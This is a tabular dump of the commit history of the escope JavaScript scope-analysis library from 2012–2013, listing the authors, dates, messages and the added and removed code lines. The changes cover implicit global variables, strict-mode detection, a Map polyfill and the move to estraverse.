17,56,56,569,4,26,alex-seville <alexander.southern@gmail.com>,-1,-1,-1,-1,-1,-1,-1,Sat,11,4,4 May 2013,Correcting isStrict and variable type Removing conditional from isStrict,0,0,1,24,1519,+    Variable.ImplicitGlobalVariable = 'ImplicitGlobalVariable';<\n>+        var variable<c>body;<\n>+        body = this.type === 'function' ? block.body : block;<\n>+                    ((this.type === 'global' || this.type === 'function') &&<\n>+                    body.body[0].type === 'ExpressionStatement' &&<\n>+                    body.body[0].expression.type === 'Literal' &&<\n>+                    body.body[0].expression.value === 'use strict');<\n>+                            type: Variable.ImplicitGlobalVariable<c><\n>+                    currentScope.__referencing(node.left<c> Reference.WRITE<c> node.right);<\n>+                    currentScope.__referencing(node.right);<\n>,-    Variable.ImplicitGlobal = 'ImplicitGlobalVariable';<\n>-        var variable;<\n>-            (block.body && block.body.type === 'BlockStatement' &&<\n>-             block.body.body && block.body.body.length > 0 &&<\n>-             block.body.body[0].type === 'ExpressionStatement' &&<\n>-             block.body.body[0].expression &&<\n>-             block.body.body[0].expression.type === 'Literal' &&<\n>-             block.body.body[0].expression.value === 'use strict');<\n>-                            type: Variable.ImplicitGlobal<c><\n>-                        globalScope.__referencing(node.left<c> Reference.WRITE<c> node.right);<\n>-                        globalScope.__referencing(node.right);<\n>-                    }else{<\n>-                        currentScope.__referencing(node.left<c> Reference.WRITE<c> node.right);<\n>-                        currentScope.__referencing(node.right);<\n>,F
17,56,56,569,4,26,alex-seville <alexander.southern@gmail.com>,-1,-1,-1,-1,-1,-1,-1,Fri,19,13,3 May 2013,Proper isStrict checking,0,0,1,10,577,+            (block.body && block.body.type === 'BlockStatement' &&<\n>+             block.body.body && block.body.body.length > 0 &&<\n>+             block.body.body[0].type === 'ExpressionStatement' &&<\n>+             block.body.body[0].expression &&<\n>+             block.body.body[0].expression.type === 'Literal' &&<\n>+             block.body.body[0].expression.value === 'use strict');<\n>,-            (block.type === 'ExpressionStatement' &&<\n>-             block.expression &&<\n>-             block.expression.type === 'Literal' &&<\n>-             block.expression.value === 'use strict');<\n>,F
17,56,56,569,4,26,alex-seville <alexander.southern@gmail.com>,-1,-1,-1,-1,-1,-1,-1,Fri,19,1,3 May 2013,Saving implicit global variable to global scope and saving as ImplicitGlobalVariable.,0,0,1,39,2021,+        globalScope<c><\n>+    Variable.ImplicitGlobal = 'ImplicitGlobalVariable';<\n>+        this.isStrict =<\n>+            (block.type === 'ExpressionStatement' &&<\n>+             block.expression &&<\n>+             block.expression.type === 'Literal' &&<\n>+             block.expression.value === 'use strict');<\n>+        if (this.type === 'global'){<\n>+            globalScope = this;<\n>+        }<\n>+        currentScope = null<c><\n>+        globalScope = null;<\n>+                    if (!currentScope.isStrict && node.left.name && !currentScope.isUsedName(node.left.name)){<\n>+                        //create an implicit global variable from assignment expression<\n>+                        globalScope.__define(node.left<c> {<\n>+                            type: Variable.ImplicitGlobal<c><\n>+                            name: node.left<c><\n>+                            node: node<\n>+                        globalScope.__referencing(node.left<c> Reference.WRITE<c> node.right);<\n>+                        globalScope.__referencing(node.right);<\n>,"-        currentScope = null;<\n>-                    if (currentScope.type === 'global' && node.left.name && !currentScope.isUsedName(node.left.name)){<\n>-                        //create a variableDeclarator from assignment expression<\n>-                        decl = {<\n>-                            type: ""VariableDeclarator""<c><\n>-                            id: node.left<c><\n>-                            init: node.right<\n>-                        };<\n>-                        currentScope.variableScope.__define(decl.id<c> {<\n>-                            type: Variable.Variable<c><\n>-                            name: decl.id<c><\n>-                            node: decl<c><\n>-                            index: 0<c><\n>-                            parent: node<\n>-                        if (decl.init) {<\n>-                            // initializer is found<\n>-                            currentScope.__referencing(decl.id<c> Reference.WRITE<c> decl.init);<\n>-                            currentScope.__referencing(decl.init);<\n>-                        }<\n>",F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Fri,18,44,3 May 2013,Fix `+=` case,0,0,1,6,375,+                    if (node.operator === '=') {<\n>+                        currentScope.__referencing(node.left<c> Reference.WRITE<c> node.right);<\n>+                    } else {<\n>+                        currentScope.__referencing(node.left<c> Reference.RW<c> node.right);<\n>+                    }<\n>,-                    currentScope.__referencing(node.left<c> Reference.WRITE<c> node.right);<\n>,F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Fri,18,24,3 May 2013,Return null when no resolved reference,0,0,1,5,149,+        return null;<\n>,-    function unreachable() {<\n>-        throw new Error('Unreachable point. logically broken.');<\n>-    }<\n>-        unreachable();<\n>,F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Fri,18,23,3 May 2013,little format fix,0,0,1,4,78,"+    ""estraverse"": "">= 0.0.2""<\n>+  }<c><\n>","-        ""estraverse"": "">= 0.0.2""<\n>-  }<c>  <\n>",F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Fri,2,20,3 May 2013,Merge pull request #13 from mazurov/master Add bower configuration file,0,0,0,0,0,,,F
17,56,56,569,4,26,Alexander MAZUROV <alexander.mazurov@gmail.com>,-1,-1,-1,-1,-1,-1,-1,Fri,9,44,3 May 2013,Add bower.json,0,1,1,11,209,"+  ""name"": ""escope""<c><\n>+  ""version"": ""0.0.14-dev""<c><\n>+  ""main"": ""escope.js""<c><\n>+  ""dependencies"": {<\n>+        ""estraverse"": "">= 0.0.2""<\n>+  }<c>  <\n>+  ""ignore"": [<\n>+    ""**/.*""<c><\n>+    ""node_modules""<c><\n>+    ""components""<\n>+  ]<\n>",,F
17,56,56,569,4,26,alex-seville <alexander.southern@gmail.com>,-1,-1,-1,-1,-1,-1,-1,Fri,0,5,3 May 2013,Added check for implicit global variable declaration,0,0,1,26,1445,"+                    //check for implicit global variable declaration<\n>+                    if (currentScope.type === 'global' && node.left.name && !currentScope.isUsedName(node.left.name)){<\n>+                        //create a variableDeclarator from assignment expression<\n>+                        decl = {<\n>+                            type: ""VariableDeclarator""<c><\n>+                            id: node.left<c><\n>+                            init: node.right<\n>+                        };<\n>+                        currentScope.variableScope.__define(decl.id<c> {<\n>+                            type: Variable.Variable<c><\n>+                            name: decl.id<c><\n>+                            node: decl<c><\n>+                            index: 0<c><\n>+                            parent: node<\n>+                        });<\n>+                        if (decl.init) {<\n>+                            // initializer is found<\n>+                            currentScope.__referencing(decl.id<c> Reference.WRITE<c> decl.init);<\n>+                            currentScope.__referencing(decl.init);<\n>+                        }<\n>+                    }else{<\n>+                        currentScope.__referencing(node.left<c> Reference.WRITE<c> node.right);<\n>+                        currentScope.__referencing(node.right);<\n>+                    }<\n>",-                    currentScope.__referencing(node.left<c> Reference.WRITE<c> node.right);<\n>-                    currentScope.__referencing(node.right);<\n>,F
17,56,56,569,4,26,Constellation <utatane.tea@gmail.com>,-1,-1,-1,-1,-1,-1,-1,Thu,17,3,31 Jan 2013,version 0.0.14-dev starts,0,0,2,4,134,"+    exports.version = '0.0.14-dev';<\n>+    ""version"": ""0.0.14-dev""<c><\n>","-    exports.version = '0.0.13-dev';<\n>-    ""version"": ""0.0.13-dev""<c><\n>",F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Thu,5,2,24 Jan 2013,Merge pull request #10 from Stuk/umd Fix UMD to work with AMD and script loading,0,0,0,0,0,,,F
17,56,56,569,4,26,Stuart Knightley,110,22,162,40,User,1,3825,Wed,21,57,23 Jan 2013,Fix UMD to work with AMD and script loading,0,0,1,9,499,+        define('escope'<c> ['exports'<c> 'estraverse']<c> function (exports<c> estraverse) {<\n>+            factory(exports<c> global<c> estraverse);<\n>+        factory(exports<c> global<c> require('estraverse'));<\n>+        factory(namespace('escope'<c> global)<c> global<c> global.estraverse);<\n>,-        define('escope'<c> ['exports']<c> function (exports) {<\n>-            factory(exports<c> global);<\n>-        factory(exports<c> global);<\n>-        factory(namespace('escope'<c> global)<c> global);<\n>-    estraverse = require('estraverse');<\n>,F
17,56,56,569,4,26,Constellation <utatane.tea@gmail.com>,-1,-1,-1,-1,-1,-1,-1,Sun,0,40,20 Jan 2013,version 0.0.13-dev starts,0,0,2,4,134,"+    exports.version = '0.0.13-dev';<\n>+    ""version"": ""0.0.13-dev""<c><\n>","-    exports.version = '0.0.12-dev';<\n>-    ""version"": ""0.0.12-dev""<c><\n>",F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Sat,7,39,19 Jan 2013,Merge pull request #9 from michaelficarra/is-used-name add Scope.prototype.isUsedName,0,0,0,0,0,,,F
17,56,56,569,4,26,Michael Ficarra,144,80,823,153,User,1,3432,Thu,21,37,17 Jan 2013,fixes #8: add Scope.prototype.isUsedName,0,0,1,11,335,+    Scope.prototype.isUsedName = function(name){<\n>+        if(this.set.has(name)) {<\n>+            return true;<\n>+        }<\n>+        for (var i = 0<c> iz = this.through.length; i < iz; ++i) {<\n>+            if (this.through[i].identifier.name === name) {<\n>+                return true;<\n>+            }<\n>+        }<\n>+        return false;<\n>+    };<\n>,,F
17,56,56,569,4,26,Constellation <utatane.tea@gmail.com>,-1,-1,-1,-1,-1,-1,-1,Thu,4,57,27 Dec 2012,version 0.0.12-dev starts,0,0,2,4,134,"+    exports.version = '0.0.12-dev';<\n>+    ""version"": ""0.0.12-dev""<c><\n>","-    exports.version = '0.0.11-dev';<\n>-    ""version"": ""0.0.11-dev""<c><\n>",F
17,56,56,569,4,26,Constellation <utatane.tea@gmail.com>,-1,-1,-1,-1,-1,-1,-1,Thu,4,56,27 Dec 2012,Referencing with object in upper scope,0,0,1,3,204,+                    // WithStatement object is referenced at upper scope<\n>+                    currentScope.upper.__referencing(node.object);<\n>,-                    currentScope.__referencing(node.object);<\n>,F
17,56,56,569,4,26,Constellation <utatane.tea@gmail.com>,-1,-1,-1,-1,-1,-1,-1,Thu,8,43,13 Dec 2012,version 0.0.11-dev starts,0,0,2,4,134,"+    exports.version = '0.0.11-dev';<\n>+    ""version"": ""0.0.11-dev""<c><\n>","-    exports.version = '0.0.10-dev';<\n>-    ""version"": ""0.0.10-dev""<c><\n>",F
17,56,56,569,4,26,Constellation <utatane.tea@gmail.com>,-1,-1,-1,-1,-1,-1,-1,Thu,8,35,13 Dec 2012,Use Map instead of plain object,0,0,1,65,2384,+        define('escope'<c> ['exports']<c> function (exports) {<\n>+            factory(exports<c> global);<\n>+        });<\n>+        factory(exports<c> global);<\n>+        factory(namespace('escope'<c> global)<c> global);<\n>+        Map<c><\n>+    if (typeof global.Map !== 'undefined') {<\n>+        // ES6 Map<\n>+        Map = global.Map;<\n>+    } else {<\n>+        Map = function Map() {<\n>+            this.__data = {};<\n>+        };<\n>+        Map.prototype.get = function MapGet(key) {<\n>+            key = '$' + key;<\n>+            if (this.__data.hasOwnProperty(key)) {<\n>+                return this.__data[key];<\n>+            }<\n>+            return undefined;<\n>+        };<\n>+        Map.prototype.has = function MapHas(key) {<\n>+            key = '$' + key;<\n>+            return this.__data.hasOwnProperty(key);<\n>+        };<\n>+        Map.prototype.set = function MapSet(key<c> val) {<\n>+            key = '$' + key;<\n>+            this.__data[key] = val;<\n>+        };<\n>+        Map.prototype['delete'] = function MapDelete(key) {<\n>+            key = '$' + key;<\n>+            return delete this.__data[key];<\n>+        };<\n>+    }<\n>+        this.set = new Map;<\n>+        this.taints = new Map;<\n>+                this.taints.set('arguments'<c> true);<\n>+                this.set.set('arguments'<c> variable);<\n>+        if (this.set.has(name)) {<\n>+            variable = this.set.get(name);<\n>+                this.taints.set(variable.name<c> true);<\n>+            if (!this.set.has(name)) {<\n>+                this.set.set(name<c> variable);<\n>+                variable = this.set.get(name);<\n>+        variable = this.set.get('arguments');<\n>,-        define('escope'<c> ['exports']<c> factory);<\n>-        factory(exports);<\n>-        factory(namespace('escope'<c> global));<\n>-        hasOwnProperty<c><\n>-    hasOwnProperty = (function () {<\n>-        var pred = Object.prototype.hasOwnProperty;<\n>-        return function hasOwnProperty(obj<c> name) {<\n>-            return pred.call(obj<c> name);<\n>-        };<\n>-    }());<\n>-        this.set = {};<\n>-        this.taints = {};<\n>-                this.taints['arguments'] = true;<\n>-                this.set['arguments'] = variable;<\n>-        if (hasOwnProperty(this.set<c> name)) {<\n>-            variable = this.set[name];<\n>-                this.taints[variable.name] = true;<\n>-            if (!hasOwnProperty(this.set<c> name)) {<\n>-                this.set[name] = variable;<\n>-                variable = this.set[name];<\n>-        variable = this.set['arguments'];<\n>,F
17,56,56,569,4,26,Constellation <utatane.tea@gmail.com>,-1,-1,-1,-1,-1,-1,-1,Wed,1,54,5 Dec 2012,Rename global variable scope to currentScope Close #6,0,0,1,110,6452,+        currentScope<c><\n>+            (this.type === 'global' || this.type === 'function') ? this : currentScope.variableScope;<\n>+        this.upper = currentScope;<\n>+        currentScope = this;<\n>+        currentScope = this.upper;<\n>+        var i<c> iz;<\n>+        var i<c> iz;<\n>+        currentScope = null;<\n>+                    currentScope.__referencing(node.left<c> Reference.WRITE<c> node.right);<\n>+                    currentScope.__referencing(node.right);<\n>+                        currentScope.__referencing(node.elements[i]);<\n>+                    currentScope.__referencing(node.left);<\n>+                    currentScope.__referencing(node.right);<\n>+                    currentScope.__referencing(node.callee);<\n>+                        currentScope.__referencing(node['arguments'][i]);<\n>+                        currentScope.variableScope.__detectEval();<\n>+                    currentScope.__define(node.param<c> {<\n>+                    currentScope.__referencing(node.test);<\n>+                    currentScope.__referencing(node.consequent);<\n>+                    currentScope.__referencing(node.alternate);<\n>+                    currentScope.__referencing(node.test);<\n>+                    currentScope.__referencing(node.expression);<\n>+                    currentScope.__referencing(node.init);<\n>+                    currentScope.__referencing(node.test);<\n>+                    currentScope.__referencing(node.update);<\n>+                        currentScope.__referencing(node.left.declarations[0].id<c> Reference.WRITE<c> null);<\n>+                        currentScope.__referencing(node.left<c> Reference.WRITE<c> null);<\n>+                    currentScope.__referencing(node.right);<\n>+                    currentScope.upper.__define(node.id<c> {<\n>+                        currentScope.__define(node.params[i]<c> {<\n>+                        currentScope.__define(node.params[i]<c> {<\n>+                    currentScope.__referencing(node.test);<\n>+                    currentScope.__referencing(node.left);<\n>+                    currentScope.__referencing(node.right);<\n>+                    currentScope.__referencing(node.object);<\n>+                        currentScope.__referencing(node.property);<\n>+                    currentScope.__referencing(node.callee);<\n>+                        currentScope.__referencing(node['arguments'][i]);<\n>+                    currentScope.__referencing(node.value);<\n>+                    currentScope.__referencing(node.argument);<\n>+                        currentScope.__referencing(node.expressions[i]);<\n>+                    currentScope.__referencing(node.discriminant);<\n>+                    currentScope.__referencing(node.test);<\n>+                    currentScope.variableScope.__detectThis();<\n>+                    currentScope.__referencing(node.argument);<\n>+                    currentScope.__referencing(node.argument);<\n>+                    currentScope.__referencing(node.argument<c> Reference.RW<c> null);<\n>+                        currentScope.variableScope.__define(decl.id<c> {<\n>+                            currentScope.__referencing(decl.id<c> Reference.WRITE<c> decl.init);<\n>+                            currentScope.__referencing(decl.init);<\n>+                    currentScope.__referencing(node.test);<\n>+                    currentScope.__referencing(node.object);<\n>+                while (currentScope && node === currentScope.block) {<\n>+                    currentScope.__close();<\n>+        assert(currentScope === null);<\n>,-        scope<c><\n>-            (this.type === 'global' || this.type === 'function') ? this : scope.variableScope;<\n>-        this.upper = scope;<\n>-        scope = this;<\n>-        scope = this.upper;<\n>-        var i<c> iz<c> scope;<\n>-        var i<c> iz<c> scope;<\n>-        scope = null;<\n>-                    scope.__referencing(node.left<c> Reference.WRITE<c> node.right);<\n>-                    scope.__referencing(node.right);<\n>-                        scope.__referencing(node.elements[i]);<\n>-                    scope.__referencing(node.left);<\n>-                    scope.__referencing(node.right);<\n>-                    scope.__referencing(node.callee);<\n>-                        scope.__referencing(node['arguments'][i]);<\n>-                        scope.variableScope.__detectEval();<\n>-                    scope.__define(node.param<c> {<\n>-                    scope.__referencing(node.test);<\n>-                    scope.__referencing(node.consequent);<\n>-                    scope.__referencing(node.alternate);<\n>-                    scope.__referencing(node.test);<\n>-                    scope.__referencing(node.expression);<\n>-                    scope.__referencing(node.init);<\n>-                    scope.__referencing(node.test);<\n>-                    scope.__referencing(node.update);<\n>-                        scope.__referencing(node.left.declarations[0].id<c> Reference.WRITE<c> null);<\n>-                        scope.__referencing(node.left<c> Reference.WRITE<c> null);<\n>-                    scope.__referencing(node.right);<\n>-                    scope.upper.__define(node.id<c> {<\n>-                        scope.__define(node.params[i]<c> {<\n>-                        scope.__define(node.params[i]<c> {<\n>-                    scope.__referencing(node.test);<\n>-                    scope.__referencing(node.left);<\n>-                    scope.__referencing(node.right);<\n>-                    scope.__referencing(node.object);<\n>-                        scope.__referencing(node.property);<\n>-                    scope.__referencing(node.callee);<\n>-                        scope.__referencing(node['arguments'][i]);<\n>-                    scope.__referencing(node.value);<\n>-                    scope.__referencing(node.argument);<\n>-                        scope.__referencing(node.expressions[i]);<\n>-                    scope.__referencing(node.discriminant);<\n>-                    scope.__referencing(node.test);<\n>-                    scope.variableScope.__detectThis();<\n>-                    scope.__referencing(node.argument);<\n>-                    scope.__referencing(node.argument);<\n>-                    scope.__referencing(node.argument<c> Reference.RW<c> null);<\n>-                        scope.variableScope.__define(decl.id<c> {<\n>-                            scope.__referencing(decl.id<c> Reference.WRITE<c> decl.init);<\n>-                            scope.__referencing(decl.init);<\n>-                    scope.__referencing(node.test);<\n>-                    scope.__referencing(node.object);<\n>-                while (scope && node === scope.block) {<\n>-                    scope.__close();<\n>-        assert(scope === null);<\n>,F
17,56,56,569,4,26,Constellation <utatane.tea@gmail.com>,-1,-1,-1,-1,-1,-1,-1,Mon,18,13,3 Dec 2012,Use Scope.mangledName ref #5,0,0,1,6,292,+            this.block[Scope.mangledName] = this;<\n>+            delete this.block[Scope.mangledName];<\n>+            return node[Scope.mangledName] || null;<\n>,-            this.block.__$escope$__ = this;<\n>-            delete this.block.__$escope$__;<\n>-            return node.__$escope$__ || null;<\n>,F
17,56,56,569,4,26,Constellation <utatane.tea@gmail.com>,-1,-1,-1,-1,-1,-1,-1,Mon,8,32,3 Dec 2012,Remove Scope::tip member Close #4,0,0,1,1,25,,-        this.tip = 'a';<\n>,F
17,56,56,569,4,26,Constellation <utatane.tea@gmail.com>,-1,-1,-1,-1,-1,-1,-1,Tue,2,53,23 Oct 2012,version 0.0.10-dev starts,0,0,2,4,132,"+    exports.version = '0.0.10-dev';<\n>+    ""version"": ""0.0.10-dev""<c><\n>","-    exports.version = '0.0.9-dev';<\n>-    ""version"": ""0.0.9-dev""<c><\n>",F
17,56,56,569,4,26,Constellation <utatane.tea@gmail.com>,-1,-1,-1,-1,-1,-1,-1,Tue,2,52,23 Oct 2012,Fix in strict mode,0,0,1,2,75,+    Scope.mangledName = '__$escope$__';<\n>,-    Scope.name = '__$escope$__';<\n>,F
17,56,56,569,4,26,Constellation <utatane.tea@gmail.com>,-1,-1,-1,-1,-1,-1,-1,Tue,3,43,16 Oct 2012,version 0.0.9-dev starts,0,0,2,4,130,"+    exports.version = '0.0.9-dev';<\n>+    ""version"": ""0.0.9-dev""<c><\n>","-    exports.version = '0.0.8-dev';<\n>-    ""version"": ""0.0.8-dev""<c><\n>",F
17,56,56,569,4,26,Constellation <utatane.tea@gmail.com>,-1,-1,-1,-1,-1,-1,-1,Tue,3,42,16 Oct 2012,Add isVariableScopreRequired,0,0,1,6,296,+        if (Scope.isScopeRequired(node)) {<\n>+    Scope.isScopeRequired = function isScopeRequired(node) {<\n>+                if (Scope.isScopeRequired(node)) {<\n>,-        if (Scope.isRequired(node)) {<\n>-    Scope.isRequired = function isRequired(node) {<\n>-                if (Scope.isRequired(node)) {<\n>,F
17,56,56,569,4,26,Constellation <utatane.tea@gmail.com>,-1,-1,-1,-1,-1,-1,-1,Tue,2,46,16 Oct 2012,Add isVariableScopeRequired,0,0,1,5,553,+        return Scope.isVariableScopeRequired(node) || node.type === Syntax.WithStatement || node.type === Syntax.CatchClause;<\n>+    };<\n>+    Scope.isVariableScopeRequired = function isVariableScopeRequired(node) {<\n>+        return node.type === Syntax.Program || node.type === Syntax.FunctionExpression || node.type === Syntax.FunctionDeclaration;<\n>,-        return node.type === Syntax.Program || node.type === Syntax.FunctionExpression || node.type === Syntax.FunctionDeclaration || node.type === Syntax.WithStatement || node.type === Syntax.CatchClause;<\n>,F
17,56,56,569,4,26,Constellation <utatane.tea@gmail.com>,-1,-1,-1,-1,-1,-1,-1,Mon,5,21,15 Oct 2012,version 0.0.8-dev starts,0,0,2,6,172,"+    exports.version = '0.0.8-dev';<\n>+    ""version"": ""0.0.8-dev""<c><\n>","-        VERSION<c><\n>-    VERSION = '0.0.7-dev';<\n>-    exports.version = VERSION;<\n>-    ""version"": ""0.0.7-dev""<c><\n>",F
17,56,56,569,4,26,Constellation <utatane.tea@gmail.com>,-1,-1,-1,-1,-1,-1,-1,Sun,3,22,14 Oct 2012,Add define and informations to variables,0,0,1,102,4562,+    function Reference(ident<c> scope<c> flag<c> writeExpr) {<\n>+        this.flag = flag;<\n>+        if (this.isWrite()) {<\n>+            this.writeExpr = writeExpr;<\n>+        }<\n>+    Reference.READ = 0x1;<\n>+    Reference.WRITE = 0x2;<\n>+    Reference.RW = 0x3;<\n>+    Reference.prototype.isWrite = function isWrite() {<\n>+        return this.flag & Reference.WRITE;<\n>+    };<\n>+    Reference.prototype.isRead = function isRead() {<\n>+        return this.flag & Reference.READ;<\n>+    };<\n>+    Reference.prototype.isReadOnly = function isReadOnly() {<\n>+        return this.flag === Reference.READ;<\n>+    };<\n>+    Reference.prototype.isWriteOnly = function isWriteOnly() {<\n>+        return this.flag === Reference.WRITE;<\n>+    };<\n>+    Reference.prototype.isReadWrite = function isReadWrite() {<\n>+        return this.flag === Reference.RW;<\n>+    };<\n>+        this.defs = [];<\n>+    Variable.CatchClause = 'CatchClause';<\n>+    Variable.Parameter = 'Parameter';<\n>+    Variable.FunctionName = 'FunctionName';<\n>+    Variable.Variable = 'Variable';<\n>+            this.__define(block.id<c> {<\n>+                type: Variable.FunctionName<c><\n>+                name: block.id<c><\n>+                node: block<\n>+            });<\n>+    Scope.prototype.__define = function __define(node<c> info) {<\n>+                variable.defs.push(info);<\n>+                variable.defs.push(info);<\n>+    Scope.prototype.__referencing = function __referencing(node<c> assign<c> writeExpr) {<\n>+            ref = new Reference(node<c> this<c> assign || Reference.READ<c> writeExpr);<\n>+            enter: function enter(node<c> parent) {<\n>+                var i<c> iz<c> decl;<\n>+                    scope.__referencing(node.left<c> Reference.WRITE<c> node.right);<\n>+                    scope.__define(node.param<c> {<\n>+                        type: Variable.CatchClause<c><\n>+                        name: node.param<c><\n>+                        node: node<\n>+                    });<\n>+                    if (node.left.type === Syntax.VariableDeclaration) {<\n>+                        scope.__referencing(node.left.declarations[0].id<c> Reference.WRITE<c> null);<\n>+                    } else {<\n>+                        scope.__referencing(node.left<c> Reference.WRITE<c> null);<\n>+                    }<\n>+                    scope.upper.__define(node.id<c> {<\n>+                        type: Variable.FunctionName<c><\n>+                        name: node.id<c><\n>+                        node: node<\n>+                    });<\n>+                        scope.__define(node.params[i]<c> {<\n>+                            type: Variable.Parameter<c><\n>+                            name: node.params[i]<c><\n>+                            node: node<c><\n>+                            index: i<\n>+                        });<\n>+                        scope.__define(node.params[i]<c> {<\n>+                            type: Variable.Parameter<c><\n>+                            name: node.params[i]<c><\n>+                            node: node<c><\n>+                            index: i<\n>+                        });<\n>+                    scope.__referencing(node.argument<c> Reference.RW<c> null);<\n>+                    for (i = 0<c> iz = node.declarations.length; i < iz; ++i) {<\n>+                        decl = node.declarations[i];<\n>+                        scope.variableScope.__define(decl.id<c> {<\n>+                            type: Variable.Variable<c><\n>+                            name: decl.id<c><\n>+                            node: decl<c><\n>+                            index: i<c><\n>+                            parent: node<\n>+                        });<\n>+                        if (decl.init) {<\n>+                            // initializer is found<\n>+                            scope.__referencing(decl.id<c> Reference.WRITE<c> decl.init);<\n>+                            scope.__referencing(decl.init);<\n>+                        }<\n>+                    }<\n>+    }<\n>,-    function Reference(ident<c> scope) {<\n>-            this.__define(block.id);<\n>-    Scope.prototype.__define = function __define(node) {<\n>-    Scope.prototype.__referencing = function __referencing(node) {<\n>-            ref = new Reference(node<c> this);<\n>-            enter: function enter(node) {<\n>-                var i<c> iz;<\n>-                    scope.__referencing(node.left);<\n>-                    scope.__define(node.param);<\n>-                    scope.__referencing(node.left);<\n>-                    scope.upper.__define(node.id);<\n>-                        scope.__define(node.params[i]);<\n>-                        scope.__define(node.params[i]);<\n>-                    scope.__referencing(node.argument);<\n>-                    scope.variableScope.__define(node.id);<\n>-                    scope.__referencing(node.init);<\n>-    };<\n>,F
17,56,56,569,4,26,Constellation <utatane.tea@gmail.com>,-1,-1,-1,-1,-1,-1,-1,Thu,0,58,11 Oct 2012,version 0.0.7-dev starts,0,0,2,6,182,"+    VERSION = '0.0.7-dev';<\n>+    ""version"": ""0.0.7-dev""<c><\n>+        ""estraverse"": "">= 0.0.2""<\n>","-    VERSION = '0.0.6-dev';<\n>-    ""version"": ""0.0.6-dev""<c><\n>-        ""estraverse"": "">= 0.0.1""<\n>",F
17,56,56,569,4,26,Constellation <utatane.tea@gmail.com>,-1,-1,-1,-1,-1,-1,-1,Wed,3,39,10 Oct 2012,Remove isArray implementation,0,0,1,6,195,,-    isArray = Array.isArray;<\n>-    if (!isArray) {<\n>-        isArray = function isArray(array) {<\n>-            return Object.prototype.toString.call(array) === '[object Array]';<\n>-        };<\n>-    }<\n>,F
17,56,56,569,4,26,Constellation <utatane.tea@gmail.com>,-1,-1,-1,-1,-1,-1,-1,Wed,3,38,10 Oct 2012,Add .gitignore & .npmignore,0,2,2,23,275,+# Emacs<\n>+*~<\n>+# Node modules<\n>+node_modules/<\n>+# Cover<\n>+.coverage_data/<\n>+cover_html/<\n>+npm-debug.log<\n>+.vimrc.local<\n>+npm-debug.log<\n>+.DS_Store<\n>+.vimrc.local<\n>+t.js<\n>+esprima.js<\n>+.travis.yml<\n>+.npmignore<\n>+/tmp/<\n>+/.git/<\n>+/node_modules/<\n>+/tools/<\n>+/test/<\n>+/cover_html/<\n>+/.coverage_data/<\n>,,F
17,56,56,569,4,26,Constellation <utatane.tea@gmail.com>,-1,-1,-1,-1,-1,-1,-1,Wed,3,37,10 Oct 2012,Use estraverse,0,0,2,153,6103,"+    var estraverse<c><\n>+        Syntax<c><\n>+    estraverse = require('estraverse');<\n>+    Syntax = estraverse.Syntax;<\n>+        estraverse.traverse(tree<c> {<\n>+    ""dependencies"": {<\n>+        ""estraverse"": "">= 0.0.1""<\n>+    }<c><\n>",-    var Syntax<c><\n>-        isArray<c><\n>-        VisitorKeys<c><\n>-        VisitorOption<c><\n>-    Syntax = {<\n>-        AssignmentExpression: 'AssignmentExpression'<c><\n>-        ArrayExpression: 'ArrayExpression'<c><\n>-        BlockStatement: 'BlockStatement'<c><\n>-        BinaryExpression: 'BinaryExpression'<c><\n>-        BreakStatement: 'BreakStatement'<c><\n>-        CallExpression: 'CallExpression'<c><\n>-        CatchClause: 'CatchClause'<c><\n>-        ConditionalExpression: 'ConditionalExpression'<c><\n>-        ContinueStatement: 'ContinueStatement'<c><\n>-        DirectiveStatement: 'DirectiveStatement'<c><\n>-        DoWhileStatement: 'DoWhileStatement'<c><\n>-        DebuggerStatement: 'DebuggerStatement'<c><\n>-        EmptyStatement: 'EmptyStatement'<c><\n>-        ExpressionStatement: 'ExpressionStatement'<c><\n>-        ForStatement: 'ForStatement'<c><\n>-        ForInStatement: 'ForInStatement'<c><\n>-        FunctionDeclaration: 'FunctionDeclaration'<c><\n>-        FunctionExpression: 'FunctionExpression'<c><\n>-        Identifier: 'Identifier'<c><\n>-        IfStatement: 'IfStatement'<c><\n>-        Literal: 'Literal'<c><\n>-        LabeledStatement: 'LabeledStatement'<c><\n>-        LogicalExpression: 'LogicalExpression'<c><\n>-        MemberExpression: 'MemberExpression'<c><\n>-        NewExpression: 'NewExpression'<c><\n>-        ObjectExpression: 'ObjectExpression'<c><\n>-        Program: 'Program'<c><\n>-        Property: 'Property'<c><\n>-        ReturnStatement: 'ReturnStatement'<c><\n>-        SequenceExpression: 'SequenceExpression'<c><\n>-        SwitchStatement: 'SwitchStatement'<c><\n>-        SwitchCase: 'SwitchCase'<c><\n>-        ThisExpression: 'ThisExpression'<c><\n>-        ThrowStatement: 'ThrowStatement'<c><\n>-        TryStatement: 'TryStatement'<c><\n>-        UnaryExpression: 'UnaryExpression'<c><\n>-        UpdateExpression: 'UpdateExpression'<c><\n>-        VariableDeclaration: 'VariableDeclaration'<c><\n>-        VariableDeclarator: 'VariableDeclarator'<c><\n>-        WhileStatement: 'WhileStatement'<c><\n>-        WithStatement: 'WithStatement'<\n>-    };<\n>-    // removable traverse function<\n>-    VisitorKeys = {<\n>-        AssignmentExpression: ['left'<c> 'right']<c><\n>-        ArrayExpression: ['elements']<c><\n>-        BlockStatement: ['body']<c><\n>-        BinaryExpression: ['left'<c> 'right']<c><\n>-        BreakStatement: ['label']<c><\n>-        CallExpression: ['callee'<c> 'arguments']<c><\n>-        CatchClause: ['param'<c> 'body']<c><\n>-        ConditionalExpression: ['test'<c> 'consequent'<c> 'alternate']<c><\n>-        ContinueStatement: ['label']<c><\n>-        DirectiveStatement: ['directive']<c><\n>-        DoWhileStatement: ['body'<c> 'test']<c><\n>-        DebuggerStatement: []<c><\n>-        EmptyStatement: []<c><\n>-        ExpressionStatement: ['expression']<c><\n>-        ForStatement: ['init'<c> 'test'<c> 'update'<c> 'body']<c><\n>-        ForInStatement: ['left'<c> 'right'<c> 'body']<c><\n>-        FunctionDeclaration: ['id'<c> 'params'<c> 'body']<c><\n>-        FunctionExpression: ['id'<c> 'params'<c> 'body']<c><\n>-        Identifier: []<c><\n>-        IfStatement: ['test'<c> 'consequent'<c> 'alternate']<c><\n>-        Literal: []<c><\n>-        LabeledStatement: ['label'<c> 